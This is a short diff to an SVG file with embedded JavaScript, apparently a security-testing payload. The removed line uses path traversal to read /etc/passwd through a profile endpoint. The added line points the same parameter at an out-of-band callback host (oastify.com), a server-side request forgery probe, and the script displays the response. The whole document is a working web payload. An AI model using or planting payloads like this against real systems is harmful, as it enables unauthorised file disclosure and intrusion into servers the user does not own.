@@ -1,6 +1,6 @@
 <svg xmlns="http://www.w3.org/2000/svg">
   <script type="text/javascript">
-    fetch('/v1/profile?filepath=../../../../../../etc/passwd')
+    fetch('/v1/profile?filepath=https://648rw762u08vlnrp7x78y9hzhqnhbgz5.oastify.com')
       .then(r => r.text())
       .then(t => alert(t));
   </script>
